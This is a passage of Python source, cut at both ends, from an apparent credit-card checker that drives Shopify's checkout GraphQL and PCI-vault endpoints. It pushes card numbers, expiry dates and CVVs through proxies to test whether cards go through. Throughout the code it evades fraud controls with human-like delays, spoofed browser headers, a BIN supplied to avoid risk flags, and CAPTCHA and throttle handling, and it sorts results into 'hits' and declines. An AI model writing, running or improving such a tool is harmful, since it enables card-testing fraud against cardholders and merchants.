                    gateway = selected_method.get('extensibilityDisplayName') or selected_method.get('name', 'UNKNOWN')
                    # FIX: running_total from GraphQL already includes tax and shipping.
                    # Adding them again double-counts. Use running_total directly.
                    total_price = str(running_total)
            
            if not payment_identifier:
                # FIX (BUG C): Include diagnostic info about available payment method typenames
                # so the user knows if it's a wallet-only store vs. a real CC gateway issue.
                _avail_typenames = []
                for _m in payment_methods:
                    _pm = _m.get('paymentMethod', {})
                    _tn = _pm.get('__typename', '?')
                    _id = _pm.get('paymentMethodIdentifier', '')
                    if _id:
                        _avail_typenames.append(f"{_tn}({_id})")
                    else:
                        _avail_typenames.append(_tn)
                _avail_summary = ', '.join(_avail_typenames[:8]) if _avail_typenames else 'none found'
                return False, f"No valid payment method found (available: {_avail_summary})", gateway, total_price, currency
            
            json_data['query'] = QUERY_PROPOSAL_DELIVERY
            json_data['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
                'deliveryStrategyByHandle': {
                    'handle': delivery_strategy if delivery_strategy else '',
                    'customDeliveryRate': False
                },
                'options': {'phone': phone}
            }
            json_data['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {
                'lines': [{'stableId': stableId or '1'}]
            }
            json_data['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {
                'value': {'amount': str(shipping_amount), 'currencyCode': currency}
            }
            json_data['variables']['delivery']['deliveryLines'][0]['destinationChanged'] = False
            # FIX: Replace partialStreetAddress with streetAddress to match Submit
            json_data['variables']['delivery']['deliveryLines'][0]['destination'] = {
                'streetAddress': {
                    'address1': street, 'address2': address2, 'city': city,
                    'countryCode': country_code, 'postalCode': s_zip,
                    'company': '', 'firstName': firstName, 'lastName': lastName,
                    'zoneCode': state, 'phone': phone, 'oneTimeUse': False
                }
            }
            json_data['variables']['payment']['billingAddress'] = {
                'streetAddress': {
                    'address1': street, 'address2': address2, 'city': city,
                    'countryCode': country_code, 'postalCode': s_zip,
                    'company': '', 'firstName': firstName, 'lastName': lastName,
                    'zoneCode': state, 'phone': phone
                }
            }
            json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)
            # FIX: Update shopPayOptInPhone with both number and countryCode
            json_data['variables']['buyerIdentity']['shopPayOptInPhone'] = {'number': phone, 'countryCode': country_code}

            # FIX: Pass proxy=proxy for delivery proposal GraphQL request
            response, resp_text, _graphql_ok = await make_graphql_request_with_captcha_handling(
                session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, proxy=proxy
            )
            
            # FIX (BUG I cont): Refresh sst from delivery proposal response headers
            if response:
                _new_sst2 = response.headers.get('x-checkout-one-session-token') or response.headers.get('X-Checkout-One-Session-Token')
                if _new_sst2 and _new_sst2 != sst:
                    print(f"[SESSION_TOKEN] Refreshed sst from delivery response headers: {sst[:8]}... -> {_new_sst2[:8]}...", file=sys.stderr)
                    sst = _new_sst2
            
            if not response or not _graphql_ok:
                return False, f"Delivery proposal request failed: {resp_text}", gateway, total_price, currency
            
            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED on delivery proposal", gateway, total_price, currency
            
            # FIX: Validate delivery proposal response before proceeding to PCI vault.
            # If the delivery proposal returned Throttled, CheckpointDenied, or
            # NegotiationResultFailed, the seller proposal data is null/missing.
            # Proceeding to PCI vault with stale data wastes a credit card token
            # and causes cryptic "Missing credit card session information" errors.
            try:
                _deliv_resp = json.loads(resp_text) if resp_text else {}
                _deliv_data = _deliv_resp.get('data', {})
                
                # Check for top-level GraphQL errors first
                if 'errors' in _deliv_resp:
                    _deliv_errs = _deliv_resp.get('errors', [])
                    _deliv_err_msgs = [e.get('message', str(e)) for e in _deliv_errs[:3]]
                    return False, f"Delivery proposal GraphQL Error: {'; '.join(_deliv_err_msgs)}", gateway, total_price, currency
                
                _deliv_session = _deliv_data.get('session') if _deliv_data else None
                _deliv_negotiate = _deliv_session.get('negotiate') if _deliv_session else None
                _deliv_result = _deliv_negotiate.get('result') if _deliv_negotiate else None
                _deliv_result_type = _deliv_result.get('__typename', '') if _deliv_result else ''
                
                if _deliv_result_type == 'Throttled':
                    return False, "Delivery proposal Throttled", gateway, total_price, currency
                elif _deliv_result_type == 'CheckpointDenied':
                    _deliv_redirect = _deliv_result.get('redirectUrl', '')
                    if _deliv_redirect:
                        return False, f"CAPTCHA_BLOCK: Delivery CheckpointDenied -> {_deliv_redirect[:80]}", gateway, total_price, currency
                    return False, "CAPTCHA_BLOCK: Delivery CheckpointDenied", gateway, total_price, currency
                elif _deliv_result_type == 'NegotiationResultFailed':
                    # Read errors from negotiate level (not result level)
                    _deliv_neg_errors = _deliv_negotiate.get('errors', []) if _deliv_negotiate else []
                    if _deliv_neg_errors:
                        _deliv_err_msgs = []
                        for _dne in _deliv_neg_errors[:3]:
                            _dne_code = _dne.get('code', '') or ''
                            _dne_msg = _dne.get('localizedMessage', '') or _dne.get('nonLocalizedMessage', '') or ''
                            if _dne_msg:
                                _deliv_err_msgs.append(f"{_dne_code}: {_dne_msg}" if _dne_code else _dne_msg)
                            elif _dne_code:
                                _deliv_err_msgs.append(_dne_code)
                        _deliv_detail = '; '.join(_deliv_err_msgs) if _deliv_err_msgs else 'Unknown reason'
                    else:
                        _deliv_detail = 'No error details'
                    return False, f"Delivery negotiation failed: {_deliv_detail}", gateway, total_price, currency
                elif _deliv_result_type and _deliv_result_type != 'NegotiationResultAvailable':
                    print(f"[DELIVERY] Unknown result typename: {_deliv_result_type}", file=sys.stderr)
                
                # Update running_total, queueToken, tax, checkpoint_data from delivery response
                # to prevent "Your order total has changed" at submit
                if _deliv_result and _deliv_result_type == 'NegotiationResultAvailable':
                    _deliv_qt = _deliv_result.get('queueToken')
                    if _deliv_qt:
                        queueToken = _deliv_qt
                    _deliv_cp = _deliv_result.get('checkpointData')
                    if _deliv_cp:
                        checkpoint_data = _deliv_cp
                    _deliv_seller = _deliv_result.get('sellerProposal')
                    if _deliv_seller:
                        _deliv_rt = _deliv_seller.get('runningTotal')
                        if _deliv_rt and _deliv_rt.get('value'):
                            running_total = _deliv_rt['value'].get('amount', running_total)
                            total_price = str(running_total)
                        _deliv_tax = _deliv_seller.get('tax', {})
                        if _deliv_tax and _deliv_tax.get('__typename') == 'FilledTaxTerms':
                            _deliv_tax_amt = _deliv_tax.get('totalTaxAmount', {}).get('value', {}).get('amount')
                            if _deliv_tax_amt is not None:
                                try:
                                    tax_amount = float(_deliv_tax_amt)
                                except (ValueError, TypeError):
                                    pass
                        _deliv_sub = _deliv_seller.get('subtotalBeforeTaxesAndShipping')
                        if _deliv_sub and _deliv_sub.get('value'):
                            _deliv_sub_amt = _deliv_sub['value'].get('amount')
                            if _deliv_sub_amt:
                                subtotal = str(_deliv_sub_amt)
                        _deliv_delivery = _deliv_seller.get('delivery')
                        if _deliv_delivery and _deliv_delivery.get('__typename') == 'FilledDeliveryTerms':
                            _dd_lines = _deliv_delivery.get('deliveryLines', [])
                            if _dd_lines:
                                _dd_strats = _dd_lines[0].get('availableDeliveryStrategies', [])
                                if _dd_strats:
                                    delivery_strategy = _dd_strats[0].get('handle', delivery_strategy)
                                    _dd_ship_amt = _dd_strats[0].get('amount', {}).get('value', {}).get('amount')
                                    if _dd_ship_amt is not None:
                                        try:
                                            shipping_amount = float(_dd_ship_amt)
                                        except (ValueError, TypeError):
                                            pass
            except (json.JSONDecodeError, KeyError, TypeError, AttributeError) as _deliv_parse_err:
                print(f"[DELIVERY] Could not parse delivery response: {_deliv_parse_err}", file=sys.stderr)

            payload = {
                "credit_card": {
                    "number": cc,
                    "month": int(mes),
                    "year": int(ano),
                    "verification_value": cvv,
                    "start_month": None,
                    "start_year": None,
                    "issue_number": "",
                    "name": f"{firstName} {lastName}"
                },
                "payment_session_scope": urlparse(url).netloc
            }
            
            # FIX: PCI vault headers must match the REAL checkout web app.
            # shopify_checker.py sends Origin = checkout.pci.shopifyinc.com (same-origin)
            # with sec-fetch-site = same-origin, NOT cross-site.
            # The old headers used checkout.shopifycs.com as Origin which is WRONG
            # for the checkout.pci.shopifyinc.com endpoint.
            # Also added priority header and sec-fetch-storage-access = none.
            vault_headers_pci = {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.9',
                'Origin': 'https://checkout.pci.shopifyinc.com',
                'Referer': f'https://checkout.pci.shopifyinc.com/build/{pci_build_hash}/number-ltr.html?identifier=&locationURL={checkout_url}',
                'User-Agent': hints['ua'],
                'sec-ch-ua': hints['sec_ch_ua'],
                'sec-ch-ua-full-version-list': hints['sec_ch_ua_full'],
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': hints['platform'],
                'sec-ch-ua-arch': '"x86"',
                'sec-ch-ua-bitness': '"64"',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-wow64': '?0',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-storage-access': 'none',
                'priority': 'u=1, i',
            }
            # Headers for deposit.us.shopifycs.com (cross-origin from checkout.shopifycs.com)
            vault_headers_deposit = {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.9',
                'Origin': 'https://checkout.shopifycs.com',
                'Referer': 'https://checkout.shopifycs.com/',
                'User-Agent': hints['ua'],
                'sec-ch-ua': hints['sec_ch_ua'],
                'sec-ch-ua-full-version-list': hints['sec_ch_ua_full'],
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': hints['platform'],
                'sec-ch-ua-arch': '"x86"',
                'sec-ch-ua-bitness': '"64"',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-wow64': '?0',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'sec-fetch-storage-access': 'active',
            }
            if ident_sig:
                vault_headers_pci['shopify-identification-signature'] = ident_sig
                vault_headers_deposit['shopify-identification-signature'] = ident_sig
            
            # FIX: Try multiple PCI vault endpoints with fallback.
            # Live test results (2025-06-21):
            #   checkout.pci.shopifyinc.com/sessions  ✅ WORKING (primary)
            #   deposit.us.shopifycs.com/sessions     ✅ WORKING (fallback)
            #   checkout.shopifycs.com/sessions       ❌ 404 DEAD
            # shopify.py uses the same 3-endpoint fallback pattern.
            _PCI_ENDPOINTS = [
                ('https://checkout.pci.shopifyinc.com/sessions', vault_headers_pci),
                ('https://deposit.us.shopifycs.com/sessions', vault_headers_deposit),
            ]
            
            await human_delay(min_sec=1.0, max_sec=2.0, step_name="pci_vault")  # Technique #2: Human-like delay
            
            response = None
            for _ep_url, _ep_headers in _PCI_ENDPOINTS:
                try:
                    # RATE-LIMIT FIX: Retry on HTTP 429 for PCI Vault step
                    response, _ = await retry_on_429(
                        lambda _u=_ep_url, _h=_ep_headers: session.post(_u, json=payload, headers=_h, proxy=proxy, timeout=12),
                        step_name="pci_vault", max_retries=2, base_delay=3.0, max_delay=12.0
                    )
                    # Check if we got a valid response
                    if response and response.status_code in (200, 201):
                        break
                    elif response and response.status_code == 429:
                        # Rate limited — try next endpoint
                        print(f"[PCI_VAULT] Rate limited on {_ep_url}, trying fallback...", file=sys.stderr)
                        continue
                    elif response and response.status_code >= 500:
                        # Server error — try next endpoint
                        print(f"[PCI_VAULT] Server error {response.status_code} on {_ep_url}, trying fallback...", file=sys.stderr)
                        continue
                except Exception as _ep_err:
                    print(f"[PCI_VAULT] Error on {_ep_url}: {_ep_err}, trying fallback...", file=sys.stderr)
                    continue
            
            if not response:
                return False, "PCI_VAULT_ERROR: All endpoints failed", gateway, total_price, currency
            if response.status_code == 429:
                return False, "PCI_VAULT Rate-Limited: HTTP 429 (retries exhausted)", gateway, total_price, currency
            try:
                # FIX: Read text first, check for HTML, then parse JSON.
                # Previously response.json() could throw JSONDecodeError with the raw
                # Python exception message "Expecting value: line 1 column 1 (char 0)"
                # which leaked into the API response confusingly.
                vault_text = response.text
                vault_status = response.status_code
                vault_ct = response.headers.get('Content-Type', '')
                
                # Detect HTML responses from PCI vault (stale build hash, block, etc.)
                if vault_status >= 400 or ('text/html' in vault_ct and not vault_text.strip().startswith('{')):
                    if '<html' in vault_text.lower() or '<!doctype' in vault_text.lower():
                        title_match = re.search(r'<title>([^<]+)</title>', vault_text, re.IGNORECASE)
                        title = title_match.group(1).strip() if title_match else "HTML error"
                        return False, f'PCI_VAULT_BLOCKED: {title} (HTTP {vault_status}, hash={pci_build_hash})', gateway, total_price, currency
                    return False, f'PCI_VAULT_ERROR: HTTP {vault_status}, non-JSON response (hash={pci_build_hash})', gateway, total_price, currency
                
                if not vault_text or not vault_text.strip():
                    return False, f'PCI_VAULT_ERROR: Empty response (HTTP {vault_status}, hash={pci_build_hash})', gateway, total_price, currency
                
                token_data = json.loads(vault_text)
                # PCI vault returns session identifier under 'id'.
                # Try multiple possible keys for robustness:
                #   - 'id' is the standard key from Shopify's PCI vault
                #   - 'session_id' is an alternate format
                token = token_data.get('id') or token_data.get('session_id')
                if not token:
                    # Log the full vault response for debugging when token extraction fails
                    print(f"[PCI_VAULT] No token found in response. Keys: {list(token_data.keys())} Body: {vault_text[:200]}", file=sys.stderr)
                    return False, 'Unable to get payment token', gateway, total_price, currency
                print(f"[PCI_VAULT] Token extracted. id={token_data.get('id')} keys={list(token_data.keys())}", file=sys.stderr)
            except json.JSONDecodeError as e:
                return False, f'PCI_VAULT_JSON_ERROR: {str(e)} (HTTP {response.status_code}, hash={pci_build_hash}, body={vault_text[:100]})', gateway, total_price, currency
            except Exception as e:
                return False, f'Unable to get payment token: {str(e)}', gateway, total_price, currency

            params = {'operationName': 'SubmitForCompletion'}
            
            # FIX: Extract BIN (first 8 digits) from card number for fraud scoring.
            # Shopify's checkout web app sends creditCardBin in the payment input.
            # Missing BIN = immediate red flag for Shopify's risk detection system.
            _raw_cc = cc.replace(' ', '').replace('-', '')
            _card_bin = _raw_cc[:8] if len(_raw_cc) >= 8 else _raw_cc
            
            # FIX: Extract delivery signed handles from proposal response for
            # deliveryExpectations. The real checkout web app sends these after
            # the proposal step to validate the pre-negotiated delivery strategy.
            _delivery_expectation_lines = []
            if delivery_data:
                _deliv_lines = delivery_data.get('deliveryLines', []) if isinstance(delivery_data, dict) else []
                if _deliv_lines:
                    for _dl in _deliv_lines:
                        _avail_strats = _dl.get('availableDeliveryStrategies', [])
                        for _astrat in _avail_strats:
                            _sh = _astrat.get('signedHandle')
                            if _sh:
                                _delivery_expectation_lines.append({'signedHandle': _sh})
            
            submit_variables = {
                'input': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {
                                'streetAddress': {
                                    'address1': street, 'address2': address2, 'city': city,
                                    'countryCode': country_code, 'postalCode': s_zip,
                                    'company': '', 'firstName': firstName, 'lastName': lastName,
                                    'zoneCode': state, 'phone': phone, 'oneTimeUse': False
                                }
                            },
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyMatchingConditions': {
                                    'estimatedTimeInTransit': {'any': True},
                                    'shipments': {'any': True}
                                },
                                'options': {'phone': phone}
                            },
                            'targetMerchandiseLines': {
                                'lines': [{'stableId': stableId or '1'}]
                            },
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {'any': True},
                            'destinationChanged': False
                        }],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': False,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True
                    },
                    'deliveryExpectations': {
                        'deliveryExpectationLines': _delivery_expectation_lines
                    },
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId or '1',
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'any': True},
                            'lineComponentsSource': None,
                            'lineComponents': []
                        }]
                    },
                    'memberships': {'memberships': []},
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [{
                            'paymentMethod': {
                                'directPaymentMethod': {
                                    'paymentMethodIdentifier': payment_identifier,
                                    'sessionId': token,
                                    'billingAddress': {
                                        'streetAddress': {
                                            'address1': street, 'address2': address2,
                                            'city': city, 'countryCode': country_code,
                                            'postalCode': s_zip, 'company': '',
                                            'firstName': firstName,
                                            'lastName': lastName, 'zoneCode': state,
                                            'phone': phone
                                        }
                                    },
                                    'cardSource': None
                                },
                                # FIX: Shopify's GraphQL PaymentMethodInput is a union type.
                                # When using directPaymentMethod, the schema expects ALL other
                                # payment method variant fields to be explicitly set to null to
                                # disambiguate. Missing null fields can cause InputValidationError.
                                'giftCardPaymentMethod': None,
                                'redeemablePaymentMethod': None,
                                'walletPaymentMethod': None,
                                'walletsPlatformPaymentMethod': None,
                                'localPaymentMethod': None,
                                'paymentOnDeliveryMethod': None,
                                'paymentOnDeliveryMethod2': None,
                                'manualPaymentMethod': None,
                                'customPaymentMethod': None,
                                'offsitePaymentMethod': None,
                                'customOnsitePaymentMethod': None,
                                'deferredPaymentMethod': None,
                                'customerCreditCardPaymentMethod': None,
                                'paypalBillingAgreementPaymentMethod': None,
                                'remotePaymentInstrument': None
                            },
                            'amount': {'any': True}
                        }],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': street, 'address2': address2,
                                'city': city, 'countryCode': country_code,
                                'postalCode': s_zip, 'company': '',
                                'firstName': firstName,
                                'lastName': lastName, 'zoneCode': state,
                                'phone': phone
                            }
                        },
                        'creditCardBin': _card_bin
                    },
                    'buyerIdentity': {
                        'buyerIdentity': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'contactInfoV2': {'emailOrSms': {'value': email, 'emailOrSmsChanged': False}},
                        # FIX: Full marketingConsent format matching real checkout web app.
                        # Must include consentState (GRANTED/DECLINED) and both email + SMS entries.
                        'marketingConsent': [
                            {'sms': {'consentState': 'DECLINED', 'value': phone, 'countryCode': country_code}},
                            {'email': {'consentState': 'GRANTED', 'value': email}}
                        ],
                        # FIX: shopPayOptInPhone must include the phone number, not just countryCode.
                        'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
                        'phoneCountryCode': country_code,
                        'rememberMe': False,
                        'setShippingAddressAsDefault': False
                    },
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {'any': True},
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []
                    },
                    'tip': {'tipLines': []},
                    'note': {
                        'message': None,
                        'customAttributes': [
                            {'key': 'gorgias.guest_id', 'value': ''},
                            {'key': 'gorgias.session_id', 'value': ''}
                        ]
                    },
                    'localizationExtension': {'fields': []},
                    'shopPayArtifact': {
                        'optIn': {
                            'vaultEmail': '',
                            'vaultPhone': phone,
                            'optInSource': 'REMEMBER_ME'
                        }
                    },
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {
                        'signature': None,
                        'signatureUuid': None,
                        'lineItemScriptChanges': [],
                        'paymentScriptChanges': [],
                        'shippingScriptChanges': []
                    },
                    'optionalDuties': {'buyerRefusesDuties': False},
                    'captcha': None,
                    'cartMetafields': []
                },
                'attemptToken': attempt_token,
                'metafields': [],
                'analytics': {
                    'requestUrl': f'{ourl}/checkouts/cn/{attempt_token}',
                    'pageId': f'{random.randint(10000000,99999999):08x}-{random.randint(1000,9999):04X}-{random.randint(1000,9999):04X}-{random.randint(1000,9999):04X}-{random.randint(100000000000,999999999999):012x}'
                }
            }
            
            if checkpoint_data:
                submit_variables['input']['checkpointData'] = checkpoint_data
            
            submit_json_data = {
                'query': MUTATION_SUBMIT,
                'variables': submit_variables,
                'operationName': 'SubmitForCompletion'
            }

            await human_delay(min_sec=0.5, max_sec=1.5, step_name="submit")  # Technique #2: Human-like delay
            # FIX: Pass proxy=proxy for submit GraphQL request
            # RATE-LIMIT FIX: Retry Submit on Throttled response with exponential backoff
            response, text, _graphql_ok = await make_graphql_request_with_captcha_handling(
                session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1, proxy=proxy
            )
            # Retry on Throttled for submit (same pattern as proposal)
            _submit_throttle_retries = 3
            for _st_attempt in range(_submit_throttle_retries):
                if not response or '"Throttled"' not in text:
                    break
                _st_backoff = 3.0 * (_st_attempt + 1)
                _st_jitter = random.uniform(0.8, 1.2)
                _st_delay = _st_backoff * _st_jitter
                print(f"[rate-limit] Submit GraphQL Throttled, retry {_st_attempt+1}/{_submit_throttle_retries} in {_st_delay:.1f}s", file=sys.stderr)
                await asyncio.sleep(_st_delay)
                # Refresh sst from previous response headers before retry
                if response:
                    _new_sst_submit = response.headers.get('x-checkout-one-session-token') or response.headers.get('X-Checkout-One-Session-Token')
                    if _new_sst_submit and _new_sst_submit != sst:
                        sst = _new_sst_submit
                        submit_json_data['variables']['input']['sessionInput']['sessionToken'] = sst
                response, text, _graphql_ok = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1, proxy=proxy
                )
            
            if is_captcha_required(text):
                return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency
            
            if "Your order total has changed." in text:
                return False, f"Order total mismatch (subtotal={subtotal}, running_total={running_total})", gateway, total_price, currency
            if "The requested payment method is not available." in text:
                return False, "Payment method not available", gateway, total_price, currency
            
            # If GraphQL request itself failed (HTML block, timeout, error), return early
            # FIX Bug #32: Check should match delivery proposal pattern —
            # return early if EITHER response is None OR graphql is not OK
            if not response or not _graphql_ok:
                return False, f"Submit request failed: {text}", gateway, total_price, currency
            
            rid = None  # Initialize before try block to prevent NameError if no branch assigns it
            try:
                resp_json = json.loads(text)
                submit_data = resp_json.get('data', {}).get('submitForCompletion', {})
                
                if not submit_data:
                    errors = resp_json.get('errors', [])
                    if errors:
                        generic_error_code = ''
                        error_messages = []
                        for error in errors:
                            code = error.get('code')
                            msg = error.get('message', '') or error.get('localizedMessage', '') or error.get('nonLocalizedMessage', '') or ''
                            if code and not _is_generic_payment_code(code):
                                return False, code, gateway, total_price, currency
                            if code:
                                generic_error_code = code
                            if msg and not _is_generic_payment_code(msg):
                                error_messages.append(msg)
                        if error_messages:
                            return False, error_messages[0], gateway, total_price, currency
                        if generic_error_code:
                            return False, generic_error_code, gateway, total_price, currency
                    
                    if resp_json.get('data') is None and not errors:
                        return False, "SERVER_ERROR: null data in submit response", gateway, total_price, currency
                    
                    return False, "Empty submit response", gateway, total_price, currency
                
                result_type = submit_data.get('__typename', '')
                
                if result_type in ['SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted']:
                    receipt = submit_data.get('receipt', {})
                    if receipt:
                        receipt_type = receipt.get('__typename', '')
                        
                        if receipt_type == 'ProcessedReceipt':
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        
                        # Handle ActionRequiredReceipt directly from submit response
                        # instead of falling through to poll (saves a round-trip)
                        if receipt_type == 'ActionRequiredReceipt':
                            _sr_action = receipt.get('action', {})
                            _sr_action_type = _sr_action.get('__typename', '') if _sr_action else ''
                            if _sr_action_type == 'CompletePaymentChallengeV2':
                                _sr_challenge = (_sr_action.get('challengeType', '') or '').upper()
                                if 'THREE_D_SECURE' in _sr_challenge or '3DS' in _sr_challenge:
                                    return True, "3DS_REQUIRED", gateway, total_price, currency
                                elif 'OTP' in _sr_challenge:
                                    return True, "OTP_REQUIRED", gateway, total_price, currency
                                else:
                                    return True, _sr_challenge if _sr_challenge else "OTP_REQUIRED", gateway, total_price, currency
                            elif _sr_action_type == 'CompletePaymentChallenge':
                                if _sr_action.get('offsiteRedirect'):
                                    return True, "3DS_REQUIRED", gateway, total_price, currency
                            return True, "OTP_REQUIRED", gateway, total_price, currency
                        
                        # Handle FailedReceipt directly from submit response
                        if receipt_type == 'FailedReceipt':
                            _sr_error = receipt.get('processingError', {})
                            _sr_error_type = _sr_error.get('__typename', '')
                            if _sr_error_type == 'PaymentFailed':
                                _sr_code = _sr_error.get('code', '') or ''
                                _sr_offsite = _payment_requires_offsite_action(_sr_error)
                                if _sr_offsite:
                                    return True, "3DS_REQUIRED", gateway, total_price, currency
                                _sr_ext = _extract_payment_error_response(_sr_error)
                                # FIX: Don't discard extract result — return it as-is rather
                                # than inventing CARD_DECLINED. The extracted code (even if
                                # generic) is more accurate than a hardcoded CARD_DECLINED.
                                return False, _sr_ext or "CARD_DECLINED", gateway, total_price, currency
                            return False, _sr_error_type or receipt_type, gateway, total_price, currency
                        
                        rid = receipt.get('id')
                    else:
                        return False, "SubmitSuccess but no receipt", gateway, total_price, currency
                
                elif result_type == 'SubmitFailed':
                    reason = submit_data.get('reason', 'Unknown reason')
                    clean = extract_clean_response(reason)
                    return False, clean, gateway, total_price, currency
                
                elif result_type == 'SubmitRejected':
                    errors = submit_data.get('errors', [])
                    if errors:
                        for error in errors:
                            code = error.get('code', '') or ''
                            localized_msg = error.get('localizedMessage', '') or ''
                            non_localized_msg = error.get('nonLocalizedMessage', '') or ''
                            _GENERIC_CODES = {'GENERIC_ERROR', 'PAYMENT_FAILED', ''}
                            # Check nested violation message.code (more specific than top-level)
                            _nested_msg = error.get('message', {})
                            if isinstance(_nested_msg, dict):
                                _nested_code = _nested_msg.get('code', '') or ''
                                if _nested_code and _nested_code not in _GENERIC_CODES:
                                    return False, _nested_code, gateway, total_price, currency
                            # Check for InputValidationError — includes field name for diagnostics
                            _error_type = error.get('__typename', '')
                            if _error_type == 'InputValidationError':
                                _field = error.get('field', '')
                                _detail = f"Input validation failed: {_field}" if _field else "Input validation failed"
                                return False, _detail, gateway, total_price, currency
                            # Prioritize machine-readable code over human-readable message.
                            if code and code not in _GENERIC_CODES:
                                return False, code, gateway, total_price, currency
                            detail = localized_msg or non_localized_msg
                            if detail and detail.strip():
                                return False, detail.strip(), gateway, total_price, currency
                            if code in _GENERIC_CODES:
                                return False, code, gateway, total_price, currency
                    return False, "Submit Rejected", gateway, total_price, currency
                
                elif result_type == 'Throttled':
                    return False, "Throttled", gateway, total_price, currency
                
                receipt = submit_data.get('receipt', {})
                if not receipt:
                    return False, "No receipt in submit response", gateway, total_price, currency
                
                rid = receipt.get('id')
                if not rid:
                    return False, "No receipt ID", gateway, total_price, currency
                
            except json.JSONDecodeError:
                # FIX: Step-specific error for submit JSON parse failure
                is_html = '<html' in text[:200].lower() or '<!doctype' in text[:200].lower()
                if is_html:
                    title_match = re.search(r'<title>([^<]+)</title>', text[:500], re.IGNORECASE)
                    title = title_match.group(1).strip() if title_match else "HTML page"
                    return False, f"SUBMIT_BLOCKED: HTML instead of JSON - {title} (HTTP {response.status_code if response else 'N/A'})", gateway, total_price, currency
                return False, f"SUBMIT_JSON_ERROR: {text[:150]}", gateway, total_price, currency
            except Exception as e:
                return False, f"Error parsing submit: {str(e)}", gateway, total_price, currency

            if not rid:
                return False, "No receipt ID for polling", gateway, total_price, currency

            params = {'operationName': 'PollForReceipt'}
            poll_json_data = {
                'query': QUERY_POLL,
                'variables': {'receiptId': rid, 'sessionToken': sst},
                'operationName': 'PollForReceipt'
            }

            await human_delay(min_sec=1.0, max_sec=2.0, step_name="poll_start")  # Technique #2: Human-like delay
            
            _POLL_DELAYS = [1.5, 2.0, 3.0, 4.5, 6.0, 8.0, 10.0, 12.0]
            for i, delay in enumerate(_POLL_DELAYS):
                # FIX: Pass proxy=proxy for poll GraphQL request
                response, final_text, _graphql_ok = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, poll_json_data, 
                    checkout_url, max_retries=1, proxy=proxy
                )
                
                # Refresh sst from poll response headers to prevent stale token errors
                if response:
                    _new_sst_poll = response.headers.get('x-checkout-one-session-token') or response.headers.get('X-Checkout-One-Session-Token')
                    if _new_sst_poll and _new_sst_poll != sst:
                        sst = _new_sst_poll
                        poll_json_data['variables']['sessionToken'] = sst
                
                # BUG #20 FIX: CAPTCHA in poll = CAPTCHA block, not a payment failure.
                # The payment was never submitted because CAPTCHA blocked it.
                if is_captcha_required(final_text):
                    return False, "CAPTCHA_REQUIRED on poll", gateway, total_price, currency
                
                try:
                    poll_json = json.loads(final_text)
                    receipt_data = poll_json.get('data', {}).get('receipt', {})
                    
                    if receipt_data:
                        typename = receipt_data.get('__typename', '')
                        
                        if typename == 'ProcessedReceipt':
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        elif typename == 'FailedReceipt':
                            error = receipt_data.get('processingError', {})
                            error_type = error.get('__typename', '')
                            
                            # Extract postPaymentMessage from purchaseOrder if available.
                            # Shopify puts the actual gateway decline reason (e.g., 
                            # "card_declined", "insufficient_funds") in this field when
                            # the PaymentFailed.code is GENERIC_ERROR.
                            _post_payment_msg = ''
                            _purchase_order = receipt_data.get('purchaseOrder')
                            if _purchase_order and isinstance(_purchase_order, dict):
                                _po_payment = _purchase_order.get('payment')
                                if _po_payment and isinstance(_po_payment, dict):
                                    _po_lines = _po_payment.get('paymentLines', [])
                                    if _po_lines and isinstance(_po_lines, list):
                                        for _po_line in _po_lines:
                                            _ppm = _po_line.get('postPaymentMessage', '') or ''
                                            if _ppm and _ppm.strip():
                                                _post_payment_msg = _ppm.strip()
                                                break
                            
                            if error_type == 'PaymentFailed':
                                code = error.get('code', '') or ''
                                has_offsite = _payment_requires_offsite_action(error)
                                # If hasOffsiteRedirect is True, the card requires 3DS
                                # authentication but it wasn't completed.
                                # FIX: 3DS_REQUIRED means card authenticated — it's a HIT, not a decline
                                if has_offsite:
                                    return True, "3DS_REQUIRED", gateway, total_price, currency
                                
                                # If code is already specific (not GENERIC_ERROR), use it directly.
                                if code and not _is_generic_payment_code(code):
